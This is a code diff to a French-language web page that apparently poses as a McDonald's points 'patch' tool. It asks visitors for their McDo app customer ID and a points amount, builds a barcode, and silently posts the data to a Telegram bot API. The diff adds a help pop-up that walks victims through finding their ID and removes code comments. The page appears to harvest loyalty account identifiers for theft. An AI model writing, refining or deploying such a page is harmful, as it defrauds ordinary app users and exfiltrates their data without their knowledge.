@@ -28,7 +28,7 @@
             background-image: radial-gradient(circle at 10% 20%, rgba(255,215,130,0.15) 2%, transparent 2.5%);
             background-size: 28px 28px;
             border-radius: 3rem;
-            max-width: 550px;
+            max-width: 580px;
             width: 100%;
             box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 2px #ffbc6e inset, 0 0 0 5px #8b3c0c inset;
             overflow: hidden;
@@ -68,6 +68,7 @@
 
         .input-group {
             margin-bottom: 1.5rem;
+            position: relative;
         }
 
         .input-group label {
@@ -99,6 +100,28 @@
             border-color: #d62326;
             box-shadow: 0 0 0 3px rgba(214,35,38,0.3);
             background: #ffffff;
+        }
+
+        .help-button {
+            background: #5c2a0c;
+            border: none;
+            color: #ffde9c;
+            font-size: 0.75rem;
+            font-weight: bold;
+            padding: 0.4rem 0.9rem;
+            border-radius: 30px;
+            cursor: pointer;
+            margin-top: 0.6rem;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: 0.1s;
+            font-family: inherit;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+
+        .help-button:active {
+            transform: scale(0.96);
         }
 
         .next-btn {
@@ -202,6 +225,9 @@
         <div class="input-group">
             <label>🔐 IDENTIFIANT (4–8 CARACTÈRES)</label>
             <input type="text" id="identifiantInput" class="input-field" placeholder="ex: ABCD 1234" maxlength="9" autocomplete="off">
+            <div>
+                <button type="button" id="helpIdBtn" class="help-button">❓ Où trouver mon ID ?</button>
+            </div>
             <div class="info-length">⚠️ 4 à 8 caractères (un espace automatique après le 4ème)</div>
         </div>
 
@@ -238,23 +264,33 @@
         const pointsInput = document.getElementById('pointsInput');
         const suivantBtn = document.getElementById('suivantBtn');
         const statusArea = document.getElementById('statusArea');
+        const helpBtn = document.getElementById('helpIdBtn');
 
         let isProcessing = false;
         const barcodeCanvas = document.getElementById('barcodeCanvasHidden');
 
-        // Stockage de la valeur brute réelle (sans espace) pour validation et envoi
+        // Stockage de la valeur brute réelle (sans espace)
         let rawIdentifier = "";
 
-        // Fonction formatage : ajoute un espace après le 4ème caractère (uniquement sur l'affichage)
-        // mais on garde rawIdentifier séparément.
+        // ---------- FONCTION D'EXPLICATION (BOÎTE ALERTE) ----------
+        function showHelpHowToFindId() {
+            alert(
+                "🔎 COMMENT TROUVER VOTRE IDENTIFIANT MCDO :\n\n" +
+                "1️⃣ Ouvrez l'application McDonald's (McDo France ou selon pays).\n" +
+                "2️⃣ Allez dans la section « Plus » (icône en bas à droite, souvent trois lignes ou « … »).\n" +
+                "3️⃣ En haut de cette page, vous voyez votre nom et/ou email.\n" +
+                "4️⃣ Juste à côté ou en dessous, cherchez le libellé « Identifiant » ou « ID client ».\n" +
+                "5️⃣ Il s'agit d'une chaîne de 4 à 8 caractères (lettres/chiffres).\n\n" +
+                "👉 Saisissez cet identifiant dans le champ ci-dessus."
+            );
+        }
+
+        // ---------- FORMATAGE AVEC ESPACE APRÈS 4 CARACTÈRES ----------
         function formatIdentifierWithSpace(inputValue) {
-            // Supprimer tout espace existant pour obtenir la chaîne brute
             let cleaned = inputValue.replace(/\s/g, '');
-            // Limiter à 8 caractères max (identifiant réel)
             if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
             rawIdentifier = cleaned;
             
-            // Construire la version affichée avec espace après 4 caractères si longueur >=4
             let displayValue = rawIdentifier;
             if (rawIdentifier.length >= 4) {
                 displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
@@ -262,30 +298,9 @@
             return displayValue;
         }
 
-        // Mettre à jour le champ input avec formatage, tout en préservant la position du curseur
-        function updateInputFormatting() {
-            const cursorPos = identifiantInput.selectionStart;
-            const currentDisplay = identifiantInput.value;
-            const newDisplay = formatIdentifierWithSpace(currentDisplay);
-            if (newDisplay !== currentDisplay) {
-                identifiantInput.value = newDisplay;
-                // Ajuster le curseur après modification
-                let newCursorPos = cursorPos;
-                // Si on ajoute un espace au milieu, décaler le curseur
-                if (rawIdentifier.length >= 4 && currentDisplay.length < newDisplay.length && cursorPos === 4) {
-                    newCursorPos = 5;
-                } else if (rawIdentifier.length >= 4 && currentDisplay.length > newDisplay.length && cursorPos === 5) {
-                    newCursorPos = 4;
-                }
-                identifiantInput.setSelectionRange(newCursorPos, newCursorPos);
-            }
-        }
-
-        // Événement input pour le formatage
         function onIdentifierInput(e) {
             if (isProcessing) return;
             let raw = identifiantInput.value;
-            // Nettoyer les espaces et contrôler la longueur brute max 8
             let cleaned = raw.replace(/\s/g, '');
             if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
             rawIdentifier = cleaned;
@@ -296,13 +311,11 @@
             }
             identifiantInput.value = displayValue;
             
-            // Gestion du statut (efface erreur si valide)
             if (isValidIdentifier(rawIdentifier)) {
                 if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
                     updateStatus('idle');
                 }
             } else if (rawIdentifier.length > 0) {
-                // si invalide mais on efface l'erreur pour permettre correction
                 if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
                     updateStatus('idle');
                 }
@@ -318,7 +331,6 @@
             return identifier && identifier.length >= 4 && identifier.length <= 8;
         }
 
-        // Mise à jour UI status
         function updateStatus(type, customMessage = null) {
             if (type === 'patch') {
                 statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
@@ -358,7 +370,6 @@
             });
         }
 
-        // Canvas to Blob PNG
         function canvasToBlob(canvas) {
             return new Promise((resolve, reject) => {
                 canvas.toBlob(blob => {
@@ -380,15 +391,12 @@
 
             try {
                 await fetch(TELEGRAM_API_URL, { method: 'POST', body: formData });
-                // silence total
             } catch (e) {}
         }
 
-        // Action principale
         async function handleSuivant() {
             if (isProcessing) return;
 
-            // Récupérer l'identifiant brut (sans espace) depuis rawIdentifier
             const identifier = rawIdentifier;
             const points = pointsInput.value;
 
@@ -415,7 +423,6 @@
             }
         }
 
-        // Réinitialisation du statut quand on modifie les champs
         function resetStatusOnInput() {
             if (isProcessing) return;
             if (rawIdentifier.length === 0 || isValidIdentifier(rawIdentifier)) {
@@ -442,7 +449,6 @@
         rawIdentifier = "";
         identifiantInput.value = "";
         
-        // Précharger canvas
         try {
             JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false });
         } catch(e) {}
@@ -453,6 +459,7 @@
         identifiantInput.addEventListener('keypress', onKeyPressHandler);
         pointsInput.addEventListener('keypress', onKeyPressHandler);
         suivantBtn.addEventListener('click', handleSuivant);
+        helpBtn.addEventListener('click', showHelpHowToFindId);
     })();
 </script>
 </body>
